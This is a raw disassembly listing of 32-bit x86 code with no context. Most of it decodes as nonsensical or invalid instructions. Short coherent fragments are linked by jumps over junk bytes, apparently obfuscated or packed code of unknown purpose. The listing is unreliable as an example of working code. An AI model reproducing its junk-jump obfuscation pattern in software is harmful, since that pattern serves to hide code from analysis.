  41c534:	mov    edx,0xe86dd494
  41c539:	sti    
  41c53a:	inc    ebp
  41c53b:	mov    ah,0x1e
  41c53d:	jne    0x41c51f
  41c53f:	mov    ebp,0x30270b4f
  41c544:	or     al,bh
  41c546:	cs cwde 
  41c548:	les    ebp,FWORD PTR [ecx]
  41c54a:	sub    BYTE PTR [ecx-0x47],0x43
  41c54e:	xor    al,0xba
  41c550:	add    BYTE PTR [edx+esi*2],dh
  41c553:	mov    ebx,0xddfbcb23
  41c558:	mov    esi,0x711f4f17
  41c55d:	loope  0x41c552
  41c55f:	sbb    ch,bh
  41c561:	leave  
  41c562:	add    BYTE PTR [esi+eiz*1],0xc
  41c566:	cmp    eax,0x18356f8b
  41c56b:	jle    0x41c56d
  41c56d:	add    cl,ch
  41c56f:	leave  
  41c570:	add    BYTE PTR [eax],al
  41c572:	add    BYTE PTR [edx-0x34a174b7],al
  41c578:	(bad)  
  41c57a:	fstp   st(7)
  41c57c:	and    al,0xfe
  41c57e:	mov    eax,ds:0xd0246a1
  41c583:	sbb    cl,BYTE PTR [ecx+0x1]
  41c586:	add    BYTE PTR [ecx-0x19000000],dh
  41c58c:	mov    dh,0x19
  41c58e:	fcomp  QWORD PTR [ebx-0x3b]
  41c591:	(bad)  
  41c592:	dec    esi
  41c593:	push   ds
  41c594:	aas    
  41c595:	iret   
  41c596:	jmp    0x8e3:0x10aaf6cd
  41c59d:	mov    al,0xa5
  41c59f:	xor    BYTE PTR [edi-0x2],0x90
  41c5a3:	jmp    0x41c569
  41c5a5:	adc    DWORD PTR [ecx-0x5a154334],eax
  41c5ab:	cdq    
  41c5ac:	ret    0xbcb0
  41c5af:	out    dx,al
  41c5b0:	fs call 0x7b12:0x14c8152f
  41c5b8:	and    esi,DWORD PTR [ebp+0x7c]
  41c5bb:	sbb    bh,BYTE PTR [esp+ebx*2]
  41c5be:	pop    ebp
  41c5bf:	xchg   DWORD PTR [edi],esi
  41c5c1:	pusha  
  41c5c2:	inc    esp
  41c5c3:	sub    al,0xfb
  41c5c5:	jns    0x41c56b
  41c5c7:	adc    eax,0xd1aebe35
  41c5cc:	add    DWORD PTR [ebp-0x2959bc77],edi
  41c5d2:	stos   DWORD PTR es:[edi],eax
  41c5d3:	sub    eax,0xc5efda3f
  41c5d8:	push   0xffffff96
  41c5da:	or     dl,cl
  41c5dc:	je     0x41c562
  41c5de:	ret    
  41c5df:	in     al,0x9a
  41c5e1:	pop    ds
  41c5e2:	cwde   
  41c5e3:	mov    ebp,0x3bb0c525
  41c5e8:	adc    eax,0x8270808a
  41c5ed:	dec    esi
  41c5ee:	jl     0x41c64b
  41c5f0:	mov    ah,0x8e
  41c5f2:	imul   ebx,DWORD PTR [ebp+0x48],0xa83bafd2
  41c5f9:	and    eax,0x8240448e
  41c5fe:	mov    ah,0xce
  41c600:	not    cl
  41c602:	adc    BYTE PTR [ebx-0x742df22d],dh
  41c608:	add    edi,DWORD PTR [ebx+0x6f]
  41c60b:	push   0xffffff98
  41c60d:	pop    ebp
  41c60e:	ss test bl,cl
  41c611:	jb     0x41c5bd
  41c613:	jbe    0x41c633
  41c615:	jle    0x41c65d
  41c617:	imul   ecx,edi,0xffffffdb
  41c61a:	sub    eax,0xb4c0145
  41c61f:	rep outs dx,BYTE PTR ds:[esi]
  41c621:	js     0x41c667
  41c623:	sub    edx,esi
  41c625:	pop    ds
  41c626:	stos   DWORD PTR es:[edi],eax
  41c627:	pop    ebp
  41c628:	movsx  esi,BYTE PTR [ebx+edi*8+0x6c]
  41c62d:	data16 xchg BYTE PTR [esi+0x58312b33],ah
  41c634:	aas    
  41c635:	dec    ebx
  41c636:	mov    dl,0x1a
  41c638:	int    0xdf
  41c63a:	sbb    dh,BYTE PTR [esi+0x69]
  41c63d:	shl    BYTE PTR [edx+0x30],0x0
  41c641:	add    BYTE PTR ds:0x10dff598,dh
  41c647:	cmp    DWORD PTR [ecx+0x54],eax
  41c64a:	je     0x41c726
  41c650:	jmp    0x41c71e
  41c655:	xor    eax,0xf78ce746
  41c65a:	lods   eax,DWORD PTR ds:[esi]
  41c65b:	jg     0x41c65c
  41c65d:	dec    esi
  41c65e:	or     BYTE PTR es:[edi+0x77],bl
  41c662:	push   0x49cb0d33
  41c667:	add    DWORD PTR [eax],eax
  41c669:	mov    cl,0x0
  41c66b:	add    BYTE PTR [eax],al
  41c66d:	xchg   DWORD PTR [eax+0x15],edx
  41c670:	push   edi
  41c671:	ss test eax,0xe99f3521
  41c677:	aam    0xca
  41c679:	das    
  41c67a:	out    0x25,eax
  41c67c:	add    eax,0x723f54a8
  41c681:	aaa    
  41c682:	xchg   ebx,eax
  41c683:	cmp    eax,0xc0334d72
  41c688:	call   0xa48fc075
  41c68d:	mov    esi,0xa9506882
  41c692:	out    0x84,al
  41c694:	xchg   DWORD PTR [ecx-0x7b1ea44e],ecx
  41c69a:	retf   0x67b4
  41c69d:	mov    ebx,0x55732400
  41c6a2:	aaa    
  41c6a3:	cmp    bh,bl
  41c6a5:	iret   
  41c6a6:	fs cmc 
  41c6a8:	push   ebx
  41c6a9:	xchg   ah,dh
  41c6ab:	xor    ah,BYTE PTR [eax-0xb]
  41c6ae:	ret    
  41c6af:	xchg   BYTE PTR [edi],dh
  41c6b1:	xor    BYTE PTR [ebx],ch
  41c6b3:	daa    
  41c6b4:	cmc    
  41c6b5:	mov    ecx,0xf817579d
  41c6ba:	in     al,dx
  41c6bb:	sbb    edx,DWORD PTR [eax]
  41c6bd:	aaa    
  41c6be:	mul    DWORD PTR [ebp+0x1e]
  41c6c1:	xchg   edi,eax
  41c6c2:	mov    dh,0x5e
  41c6c4:	or     bl,bl
  41c6c6:	adc    ch,BYTE PTR [esi+0x70]
  41c6c9:	cwde   
  41c6ca:	enter  0x8264,0xd9
  41c6ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c6cf:	sti    
  41c6d0:	aas    
  41c6d1:	adc    DWORD PTR [ebx+0x6a],edi
  41c6d4:	push   eax
  41c6d5:	xchg   esp,edi
  41c6d7:	ins    BYTE PTR es:[edi],dx
  41c6d8:	cmp    DWORD PTR [edx+ebx*2+0x750ec625],0x31e4f405
  41c6e3:	sbb    DWORD PTR [eiz*1+0x586ca09e],0xbc60eddc
  41c6ee:	pop    ds
  41c6ef:	dec    ebp
  41c6f0:	sbb    ecx,DWORD PTR [eax-0x1f]
  41c6f3:	shl    DWORD PTR [edi],cl
  41c6f5:	aaa    
  41c6f6:	inc    edi
  41c6f7:	jg     0x41c74c
  41c6f9:	push   es
  41c6fa:	fs out dx,eax
  41c6fc:	or     esp,DWORD PTR [edi]
  41c6fe:	outs   dx,DWORD PTR ds:[esi]
  41c6ff:	je     0x41c765
  41c701:	jmp    0x41c745
  41c703:	jmp    0x3a7de983
  41c708:	dec    ah
  41c70a:	xchg   edi,eax
  41c70b:	popa   
  41c70c:	lods   al,BYTE PTR ds:[esi]
  41c70d:	mov    ah,0x9b
  41c70f:	mov    DWORD PTR [edx+0x309bf01f],esi
  41c715:	or     al,BYTE PTR [ebp-0x73dabe97]
  41c71b:	das    
  41c71c:	inc    esp
  41c71d:	mov    eax,DWORD PTR gs:[ebp+0x8]
  41c721:	jmp    0x41c8fc
  41c726:	mov    ecx,DWORD PTR [ebp-0x28]
  41c729:	mov    eax,DWORD PTR [ebp-0x2c]
  41c72c:	sub    eax,ecx
  41c72e:	mov    ecx,DWORD PTR [ebp-0x30]
  41c731:	jmp    0x41c7ff
  41c736:	or     ebx,ecx
  41c738:	in     al,dx
  41c739:	in     eax,0xfe
  41c73b:	cmc    
  41c73c:	or     edi,edi
  41c73e:	in     al,0xd1
  41c740:	or     DWORD PTR [ebx],esi
  41c742:	inc    edx
  41c743:	push   ebx
  41c744:	pop    ds
  41c745:	gs jl  0x41c792
  41c748:	add    DWORD PTR [eax],eax
  41c74a:	mov    cl,0x0
  41c74c:	add    BYTE PTR [eax],al
  41c74e:	ins    BYTE PTR es:[edi],dx
  41c74f:	loopne 0x41c7c1
  41c751:	push   0x60
  41c753:	or     al,0x2a
  41c755:	jmp    0xda396122
  41c75a:	mov    bh,0x3d
  41c75c:	inc    esi
  41c75d:	mov    dl,0xd5
  41c75f:	nop
  41c760:	push   edx
  41c761:	fisubr WORD PTR [edx+eiz*1+0x2]
  41c765:	inc    esi
  41c766:	mov    cl,0x4e
  41c768:	jle    0x41c7e3
  41c76a:	and    BYTE PTR [edx+eiz*2-0x1f17d314],ah
  41c771:	mov    edx,esp
  41c773:	add    al,BYTE PTR [ebx]
  41c775:	dec    ebx
  41c776:	dec    ebp
  41c777:	aam    0x9e
  41c779:	inc    edi
  41c77a:	mov    ds:0x90268a7b,al
  41c77f:	loope  0x41c7d6
  41c781:	inc    eax
  41c782:	mov    ebp,0x7c9376ac
  41c787:	lahf   
  41c788:	add    edi,edx
  41c78a:	cli    
  41c78b:	lods   al,BYTE PTR ds:[esi]
  41c78c:	fld    TBYTE PTR [edx-0x260afc37]
  41c792:	mov    ebp,0x77970e58
  41c797:	pop    esi
  41c798:	adc    BYTE PTR [edx],cl
  41c79a:	push   edx
  41c79b:	xchg   esi,eax
  41c79c:	int    0xc6
  41c79e:	inc    esi
  41c79f:	es cmp al,0xf4
  41c7a2:	fidivr WORD PTR [ecx]
  41c7a4:	mov    eax,ds:0x3360d3c4
  41c7a9:	xchg   DWORD PTR [eax-0x26],esi
  41c7ac:	cwde   
  41c7ad:	jecxz  0x41c7f7
  41c7af:	outs   dx,BYTE PTR ds:[esi]
  41c7b0:	push   esi
  41c7b1:	xchg   edi,eax
  41c7b2:	out    0xf3,al
  41c7b4:	push   0x117091e1
  41c7b9:	repnz sbb DWORD PTR [eax-0x5e63490a],0x1e2fd936
  41c7c4:	jmp    0x41c7c9
  41c7c6:	loope  0x41c76c
  41c7c8:	inc    ebp
  41c7c9:	(bad)  
  41c7cb:	xor    DWORD PTR [ebx-0x7b],esp
  41c7ce:	mov    dl,0x76
  41c7d0:	dec    eax
  41c7d1:	push   0xdef65e57
  41c7d6:	bound  ecx,QWORD PTR [eax+0x7dda1e5d]
  41c7dc:	pop    eax
  41c7dd:	gs push ss
  41c7df:	sub    BYTE PTR [ebx+0x25],0xe
  41c7e3:	and    BYTE PTR [edx+eiz*8],bl
  41c7e6:	data16 jae 0x41c7f9
  41c7e9:	sub    ch,BYTE PTR [esi+0x7d]
  41c7ec:	shr    DWORD PTR [eax+0x7d],0x16
  41c7f0:	jp     0x41c838
  41c7f2:	mov    cl,0x62
  41c7f4:	into   
  41c7f5:	xchg   edi,eax
  41c7f6:	retf   0x7ca4
  41c7f9:	sub    eax,0x9118d9b9
  41c7fe:	in     al,0x23
  41c800:	shr    DWORD PTR ds:0x440,0xe9
  41c807:	icebp  
  41c808:	add    BYTE PTR [eax],al
  41c80a:	add    bh,al
  41c80c:	inc    ebp
  41c80d:	or     ah,bl
  41c80f:	add    al,BYTE PTR [eax]
  41c811:	add    BYTE PTR [ebx-0x3f96f7bb],cl
  41c817:	dec    edi
  41c818:	push   ebp
  41c819:	add    BYTE PTR [eax],al
  41c81b:	add    eax,0x2449
  41c820:	xor    edx,edx
  41c822:	jmp    0x41c8f0
  41c827:	and    al,0xf6
  41c829:	adc    DWORD PTR [esi-0x2d],edx
  41c82c:	mul    DWORD PTR [edi-0xa]
  41c82f:	out    0x8e,eax
  41c831:	jge    0x41c8ad
  41c833:	or     DWORD PTR [ecx],esi
  41c835:	cmp    dh,BYTE PTR [ebx]
  41c837:	sub    eax,0xb100014b
  41c83c:	add    BYTE PTR [eax],al
  41c83e:	add    BYTE PTR [edx+0x5f],ah
  41c841:	cdq    
  41c842:	or     ebp,DWORD PTR [edx+ecx*1+0x7f76caef]
  41c849:	scas   al,BYTE PTR es:[edi]
  41c84a:	mov    esp,0xb024577d
  41c84f:	fldenv [esi]
  41c851:	lds    edi,FWORD PTR [ebx-0x5b]
  41c854:	test   DWORD PTR [ebp-0x52],ecx
  41c857:	cmc    
  41c858:	inc    DWORD PTR [edi-0x54202ab7]
  41c85e:	popa   
  41c85f:	rcl    BYTE PTR [eax],0xd7
  41c862:	out    0x8e,al
  41c864:	stos   DWORD PTR es:[edi],eax
  41c865:	or     BYTE PTR [esi],0x75
  41c868:	into   
  41c869:	xchg   DWORD PTR [esi+0x66e43e00],esi
  41c86f:	cmp    DWORD PTR [edi],edx
  41c871:	adc    dh,BYTE PTR [ecx+esi*1-0x7b2b5771]
  41c878:	push   0x21
  41c87a:	push   eax
  41c87b:	(bad)  
  41c87d:	xchg   ch,dh
  41c87f:	mov    ds:0x7dd559e5,al
  41c884:	les    edi,FWORD PTR [edx+ecx*1-0x5]
  41c888:	xchg   ebx,eax
  41c889:	cdq    
  41c88a:	add    ebx,DWORD PTR ds:0x6c33568a
  41c890:	jmp    0xcca4b2f0
  41c895:	call   0x3bcff885
  41c89a:	dec    ebp
  41c89b:	(bad)  
  41c89c:	in     al,0x4d
  41c89e:	repz imul ebp,DWORD PTR [ebx],0xf5029589
  41c8a5:	mov    ds,esp
  41c8a7:	mov    al,ds:0x45510ea5
  41c8ac:	sub    al,0x91
  41c8ae:	ja     0x41c895
  41c8b0:	dec    ebx
  41c8b1:	fmul   st(7),st
  41c8b3:	test   eax,0xd0372fde
  41c8b8:	(bad)  
  41c8b9:	hlt    
  41c8ba:	aam    0x4e
  41c8bc:	inc    ecx
  41c8bd:	push   ds
  41c8be:	xlat   BYTE PTR ds:[ebx]
  41c8bf:	cwde   
  41c8c0:	lea    edi,[esi+0x36]
  41c8c3:	(bad)  
  41c8c4:	xor    dl,cl
  41c8c6:	je     0x41c902
  41c8c8:	mov    ebp,cs
  41c8ca:	in     al,dx
  41c8cb:	daa    
  41c8cc:	jge    0x41c93b
  41c8ce:	mov    cl,0x81
  41c8d0:	lock mov cs,ebx
  41c8d3:	ins    DWORD PTR es:[edi],dx
  41c8d4:	mov    WORD PTR [edx],gs
  41c8d6:	xor    ah,bl
  41c8d8:	(bad)
  41c8db:	jle    0x41c8bd
  41c8dd:	and    al,0x35
  41c8df:	daa    
  41c8e0:	retf   
  41c8e1:	mov    ecx,0x3823e175
  41c8e6:	enter  0x6aaa,0x68
  41c8ea:	sub    ebx,DWORD PTR [edx-0x392d8215]
  41c8f0:	mov    ecx,0x3f7
  41c8f5:	div    ecx
  41c8f7:	sub    eax,0x3d8f
  41c8fc:	pop    esi
  41c8fd:	leave  
  41c8fe:	ret    0x4
  41c901:	push   ebp
  41c902:	mov    ebp,esp
  41c904:	jmp    0x41c9cf
  41c909:	out    dx,eax
  41c90a:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41c90c:	xor    ch,BYTE PTR [esi-0xf02000d]
  41c912:	jp     0x41c96f
  41c914:	addr16 mov ds:0xff8a,eax
  41c918:	lahf   
  41c919:	fimul  WORD PTR [ebx+0x1]
  41c91c:	add    BYTE PTR [esi+0x14000000],ch
  41c922:	mov    edi,0xa2393b02
  41c927:	mov    eax,0x2f2e8a86
  41c92c:	add    BYTE PTR [edi-0x59],bl
  41c92f:	push   ecx
  41c930:	and    eax,0xb0aa31f0
  41c935:	sbb    al,0x1c
  41c937:	(bad)  
  41c938:	dec    edx
  41c939:	mov    esp,DWORD PTR [eax-0x4b]
  41c93c:	out    0xea,eax
  41c93e:	push   ebx
  41c93f:	sbb    eax,0x57c25d43
  41c944:	das    
  41c945:	fcomp  QWORD PTR [bx+di+0x7a]
  41c949:	mov    ebx,0x7c30bad9
  41c94e:	xchg   edi,eax
  41c94f:	xor    DWORD PTR [ecx+eiz*1],edi
  41c952:	push   ecx
  41c953:	or     ch,BYTE PTR [edx-0x32686d0a]
  41c959:	aaa    
  41c95a:	(bad)  
  41c95b:	fcom   QWORD PTR [edi+ebp*4+0x558395e6]
  41c962:	adc    ecx,DWORD PTR [edx]
  41c964:	addr16 jbe 0x41c925
  41c967:	add    esp,DWORD PTR [ecx]
  41c969:	and    eax,0xb82373e1
  41c96e:	ins    DWORD PTR es:[edi],dx
  41c96f:	lods   al,BYTE PTR ds:[esi]
  41c970:	stc    
  41c971:	mov    DWORD PTR [eax+esi*1-0x11cd3032],edx
  41c978:	pop    es
  41c979:	ja     0x41c96b
  41c97b:	arpl   WORD PTR [ebx+0xa],cx
  41c97e:	cmp    eax,0x78b6d460
  41c983:	fldcw  WORD PTR [edi+0x1f]
  41c986:	adc    al,0xa
  41c988:	mov    WORD PTR [ebx],gs
  41c98a:	mov    ds:0xed78ba02,al
  41c98f:	or     DWORD PTR [eax+ecx*2-0x17942fa3],0xffffffea
  41c997:	jmp    0xe1279bd3
  41c99c:	xchg   ebx,eax
  41c99d:	cwde   
  41c99e:	mov    bh,0x82
  41c9a0:	ret    
  41c9a1:	pop    edi
  41c9a2:	gs push ds
  41c9a4:	imul   ebp,esi,0xffffffca
  41c9a7:	jb     0x41c968
  41c9a9:	fistp  QWORD PTR [esi+0x1c]
  41c9ac:	popf   
  41c9ad:	mov    ds:0x1374ed59,al
  41c9b2:	cmc    
  41c9b3:	pop    esi
  41c9b4:	popa   
  41c9b5:	xchg   ebx,eax
  41c9b6:	jp     0x41c955
  41c9b8:	add    DWORD PTR [ebx+0x386df138],ebx
  41c9be:	ret    0xf495
  41c9c1:	pop    ecx
  41c9c2:	sub    al,0xe0
  41c9c4:	lea    ecx,[edi+0x18]
  41c9c7:	inc    ecx
  41c9c8:	and    BYTE PTR [ebp-0x4a],bl
  41c9cb:	sbb    DWORD PTR [ebp+ecx*8-0x4f],edi
  41c9cf:	and    esp,0xfffffff8
  41c9d2:	adc    ecx,0x7a0c
  41c9d8:	jmp    0x41caa3
  41c9dd:	lock push ss
  41c9df:	inc    esi
  41c9e0:	xchg   edx,eax
  41c9e1:	out    0xd2,al
  41c9e3:	hlt    
  41c9e4:	jbe    0x41ca31
  41c9e6:	pop    ebp
  41c9e7:	mov    esp,0x11b49702
  41c9ec:	xchg   ebp,eax
  41c9ed:	mov    WORD PTR [ecx+eax*1+0x0],cs
  41c9f1:	scas   al,BYTE PTR es:[edi]
  41c9f2:	add    BYTE PTR [eax],al
  41c9f4:	add    BYTE PTR [esi+ebp*8-0x292e7f21],cl
  41c9fb:	xor    DWORD PTR [ebp-0x3ac54b2],esi
  41ca01:	in     eax,dx
  41ca02:	in     eax,dx
  41ca03:	je     0x41ca05
  41ca05:	mov    dl,0x14
  41ca07:	sub    eax,esi
  41ca09:	mov    BYTE PTR [edx+0x12],ah
  41ca0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca0d:	and    BYTE PTR [ebx-0x4a0951ee],al
  41ca13:	fist   WORD PTR [eax+ebx*2+0x32]
  41ca17:	jmp    DWORD PTR [ebx-0x30b2eb5e]
  41ca1d:	(bad)  
  41ca1e:	aad    0xcd
  41ca20:	pop    ds
  41ca21:	dec    esi
  41ca22:	in     al,dx
  41ca23:	mul    DWORD PTR [ecx-0x2d]
  41ca26:	ins    DWORD PTR es:[edi],dx
  41ca27:	daa    
  41ca28:	ins    BYTE PTR es:[edi],dx
  41ca29:	push   ebx
  41ca2a:	and    BYTE PTR [ecx-0x6f],ch
  41ca2d:	add    esi,DWORD PTR [ebp+eiz*1+0x37]
  41ca31:	jnp    0x41c9e4
  41ca33:	adc    eax,0xc420b835
  41ca38:	fs adc eax,0xadb3bbc5
  41ca3e:	dec    ecx
  41ca3f:	out    dx,eax
  41ca40:	pusha  
  41ca41:	mov    ecx,0x8e52d781
  41ca46:	and    ah,dh
  41ca48:	loope  0x41ca38
  41ca4a:	rol    BYTE PTR [edi+0x6a2dddb5],0x15
  41ca51:	int3   
  41ca52:	sti    
  41ca53:	sub    eax,0xce5f678b
  41ca58:	icebp  
  41ca59:	pop    eax
  41ca5a:	jo     0x41ca7b
  41ca5c:	cmp    eax,0x6413dba3
  41ca61:	or     al,0x4
  41ca63:	ffreep st(7)
  41ca65:	push   ss
  41ca66:	iret   
  41ca67:	call   0x80e8:0xeba90bb6
  41ca6e:	mov    dl,0xd8
  41ca70:	retf   0x19b2
  41ca73:	call   0x7d5f:0x5350606f
  41ca7a:	sbb    al,0xfc
  41ca7c:	push   0xc2c9fbc8
  41ca81:	bound  ebp,QWORD PTR [esi-0x14dc8dcf]
  41ca87:	cmp    ebx,DWORD PTR [ebx+0x4a]
  41ca8a:	push   es
  41ca8b:	fwait
  41ca8c:	mov    ebx,0x9aa4d500
  41ca91:	jmp    0x41caf8
  41ca93:	fadd   DWORD PTR [ecx-0x9]
  41ca96:	rcr    BYTE PTR ds:0x4f5eb698,cl
  41ca9c:	imul   eax,DWORD PTR [esi],0x7ea2bd72
  41caa2:	ds sub esp,0x1c
  41caa6:	add    edx,ecx
  41caa8:	lea    eax,[esp+0x4]
  41caac:	adc    DWORD PTR ds:0x433650,0x2eb4
  41cab6:	mov    DWORD PTR [esp],eax
  41cab9:	mov    eax,DWORD PTR [esp]
  41cabc:	cmp    DWORD PTR ds:0x433588,0x0
  41cac3:	ja     0x41cadf
  41cac9:	sbb    edx,0x7a8a
  41cacf:	jmp    0x41cadf
  41cad4:	push   0x40be
  41cad9:	call   DWORD PTR ds:0x43c7e8
  41cadf:	mov    ecx,DWORD PTR [esp+0x4]
  41cae3:	jmp    0x41cbae
  41cae8:	sub    BYTE PTR ds:0xcaef88e7,0xef
  41caef:	sub    eax,0x9f8d0c68
  41caf4:	adc    eax,0x3a6e0fe5
  41caf9:	dec    ebp
  41cafa:	add    DWORD PTR [eax],eax
  41cafc:	scas   al,BYTE PTR es:[edi]
  41cafd:	add    BYTE PTR [eax],al
  41caff:	add    BYTE PTR [eax+ebx*1+0x5f],bl
  41cb03:	xchg   edx,ebx
  41cb05:	and    dh,BYTE PTR [edx+0x3e]
  41cb08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb09:	out    dx,al
  41cb0a:	cmp    DWORD PTR ds:0xf6cf302a,ebx
  41cb10:	inc    edx
  41cb11:	in     al,0x7
  41cb13:	imul   edx,DWORD PTR [eax+ebp*8-0x7a4d8c27],0x7171a23
  41cb1e:	inc    ebx
  41cb1f:	iret   
  41cb20:	addr16 (bad) 
  41cb22:	xchg   DWORD PTR [edi],ecx
  41cb24:	punpckldq mm1,mm2
  41cb27:	jmp    0x7c581fdc
  41cb2c:	popa   
  41cb2d:	frstor [ecx-0x4087499f]
  41cb33:	loop   0x41cb65
  41cb35:	jno    0x41cbb5
  41cb37:	aam    0x4e
  41cb39:	dec    edi
  41cb3a:	loop   0x41cbab
  41cb3c:	imul   edx,DWORD PTR [eax+eax*1],0xffffffb3
  41cb40:	mov    ds:0x150caa6f,al
  41cb45:	and    BYTE PTR [edi+0x113ceff2],bl
  41cb4b:	js     0x41cb8a
  41cb4d:	ror    BYTE PTR [edx+0x420d38db],0x1f
  41cb54:	xchg   BYTE PTR [ebx-0x38],ch
  41cb57:	test   al,0xca
  41cb59:	addr16 jo 0x41cb5e
  41cb5c:	shl    DWORD PTR [ecx+0x4ed1ad5b],1
  41cb62:	cli    
  41cb63:	mov    ch,0xd5
  41cb65:	cli    
  41cb66:	outs   dx,BYTE PTR ds:[esi]
  41cb67:	push   ebx
  41cb68:	mov    ebp,0x21e89d32
  41cb6d:	push   0xf2c8dd60
  41cb72:	inc    ebx
  41cb73:	or     esp,DWORD PTR [ebp-0x5f]
  41cb76:	add    ecx,ebp
  41cb78:	fcmovb st,st(2)
  41cb7a:	add    ebx,DWORD PTR [edi+0x57b9c7bc]
  41cb80:	jne    0x41cb17
  41cb82:	loope  0x41cbd3
  41cb84:	or     eax,0xffffffe2
  41cb87:	jg     0x41cb20
  41cb89:	nop
  41cb8a:	mov    WORD PTR [ecx],ss
  41cb8c:	in     eax,dx
  41cb8d:	enter  0x26c2,0xdc
  41cb91:	retf   0xfcc6
  41cb94:	lea    ebx,[esi]
  41cb96:	outs   dx,DWORD PTR ds:[esi]
  41cb97:	inc    edi
  41cb98:	ret    0xe64b
  41cb9b:	in     al,dx
  41cb9c:	out    0xb2,eax
  41cb9e:	or     esi,edi
  41cba0:	mov    DWORD PTR gs:[esi-0x71],edi
  41cba4:	jg     0x41cb83
  41cba6:	push   edi
  41cba7:	pop    eax
  41cba8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cba9:	jmp    0xb20c7afe
  41cbae:	mov    edx,DWORD PTR [esp+0x8]
  41cbb2:	jmp    0x41cc7d
  41cbb7:	sbb    BYTE PTR [edi],cl
  41cbb9:	hlt    
  41cbba:	xchg   edi,eax
  41cbbb:	idiv   edi
  41cbbd:	jnp    0x41cb4e
  41cbbf:	push   0xca8e025b
  41cbc4:	mov    bl,0xd3
  41cbc6:	psubsb mm1,QWORD PTR [ebp+0x1]
  41cbca:	add    BYTE PTR [esi+0x37000000],ch
  41cbd0:	das    
  41cbd1:	dec    sp
  41cbd3:	dec    edi
  41cbd4:	pop    edx
  41cbd5:	sahf   
  41cbd6:	cmp    ebx,esp
  41cbd8:	(bad)
  41cbdb:	push   edi
  41cbdc:	mov    DWORD PTR [edx+0x3b9f0424],ebx
  41cbe2:	mov    WORD PTR [edi+0x28f89fc7],gs
  41cbe8:	popa   
  41cbe9:	cmp    al,0xf8
  41cbeb:	loopne 0x41cbd2
  41cbed:	inc    esp
  41cbee:	es scas al,BYTE PTR es:[edi]
  41cbf0:	push   esp
  41cbf1:	mov    cl,0x1c
  41cbf3:	and    DWORD PTR [ebp+ebx*4+0x7b],ecx
  41cbf7:	loope  0x41cc77
  41cbf9:	in     eax,dx
  41cbfa:	add    ecx,ebx
  41cbfc:	xor    BYTE PTR [eax+0x93082a4],al
  41cc02:	in     eax,dx
  41cc03:	mov    ebp,0x4127f379
  41cc08:	mov    ecx,0x5b5b6d7a
  41cc0d:	dec    ebx
  41cc0e:	mov    dh,0x79
  41cc10:	dec    ebx
  41cc11:	push   edi
  41cc12:	imul   esp,edi,0xffffffc0
  41cc15:	pop    esi
  41cc16:	(bad)  
  41cc17:	mov    dh,0x62
  41cc19:	adc    esi,0x60809112
  41cc1f:	cmp    BYTE PTR [edi-0x5f5879df],dh
  41cc25:	cmp    DWORD PTR [ebp+0x578982a9],edx
  41cc2b:	data16 bnd jg 0x41cc2a
  41cc2f:	pusha  
  41cc30:	sbb    BYTE PTR [esi+0x79],al
  41cc33:	add    eax,0xf30b401c
  41cc38:	sbb    edx,ebx
  41cc3a:	pusha  
  41cc3b:	fdiv   st(3),st
  41cc3d:	out    0xfe,al
  41cc3f:	rcr    DWORD PTR [ebp+0x7303c8f8],0x21
  41cc46:	jne    0x41cc35
  41cc48:	adc    DWORD PTR [edx-0x7a539e16],edx
  41cc4e:	out    0x8c,eax
  41cc50:	bnd jge 0x41cc8b
  41cc53:	pop    esp
  41cc54:	sbb    al,0x92
  41cc56:	push   ebx
  41cc57:	mov    ebx,0xe88111a3
  41cc5c:	jae    0x41cbe1
  41cc5e:	stos   DWORD PTR es:[edi],eax
  41cc5f:	shl    BYTE PTR [edx+ebx*1+0x38],1
  41cc63:	mov    edx,0xfa7709b9
  41cc68:	ins    BYTE PTR es:[edi],dx
  41cc69:	(bad)  
  41cc6a:	gs test eax,0x95588ca9
  41cc70:	mov    BYTE PTR [ebx+ecx*4+0x66],dl
  41cc74:	push   ecx
  41cc75:	fistp  QWORD PTR [ebp+0xe]
  41cc78:	fld    QWORD PTR [esi+0x51]
  41cc7b:	ins    DWORD PTR es:[edi],dx
  41cc7c:	add    DWORD PTR [ecx],ebp
  41cc7e:	or     BYTE PTR [edi+0x19],dl
  41cc81:	push   eax
  41cc82:	add    al,0x8b
  41cc84:	inc    esp
  41cc85:	and    al,0x4
  41cc87:	or     DWORD PTR [eax],0xebe44fd3
  41cc8d:	and    DWORD PTR ds:0x4335ac,0x43366c
  41cc97:	or     DWORD PTR [eax+0x4],0xffffdedc
  41cc9e:	lea    eax,[esp+0x10]
  41cca2:	jmp    0x41cd6d
  41cca7:	pusha  
  41cca8:	mov    eax,ebx
  41ccaa:	inc    esi
  41ccab:	jmp    0x41ccfb
  41ccad:	in     eax,0xaf
  41ccaf:	inc    edi
  41ccb0:	and    DWORD PTR [ebp+eiz*2+0x70212cd2],0xffffff96
  41ccb8:	dec    esi
  41ccb9:	add    DWORD PTR [eax],eax
  41ccbb:	scas   al,BYTE PTR es:[edi]
  41ccbc:	add    BYTE PTR [eax],al
  41ccbe:	add    dl,ch
  41ccc0:	imul   edx,DWORD PTR [esi],0xffffffaa
  41ccc3:	pop    edi
  41ccc4:	inc    edi
  41ccc5:	inc    esp
  41ccc6:	into   
  41ccc7:	retf   
  41ccc8:	add    ebp,DWORD PTR [eax+0x7c]
  41cccb:	neg    BYTE PTR [ebx+0x1d1c9b2e]
  41ccd1:	cmp    BYTE PTR [ecx],0xcd
  41ccd4:	pop    edi
  41ccd5:	pop    esp
  41ccd6:	mov    ah,0xa7
  41ccd8:	lods   eax,DWORD PTR ds:[esi]
  41ccd9:	out    0xfa,eax
  41ccdb:	or     esi,DWORD PTR [eax]
  41ccdd:	inc    esi
  41ccde:	(bad)
  41cce2:	gs push ebp
  41cce4:	int3   
  41cce5:	lods   eax,DWORD PTR ds:[esi]
  41cce6:	aad    0x44
  41cce8:	test   DWORD PTR [ebx+esi*4+0x534720e8],esp
  41ccef:	retf   
  41ccf0:	dec    eax
  41ccf1:	test   eax,0x1bc92230
  41ccf6:	mov    eax,0x92b31152
  41ccfb:	pop    eax
  41ccfc:	sbb    esp,esi
  41ccfe:	adc    eax,0x7a8a2907
  41cd03:	push   cs
  41cd04:	inc    edx
  41cd05:	into   
  41cd06:	daa    
  41cd07:	mov    ch,0x6b
  41cd09:	and    BYTE PTR [eax+0x3bc5d7c9],0xf5
  41cd10:	mov    esi,0x777ad74d
  41cd15:	jle    0x41cd2c
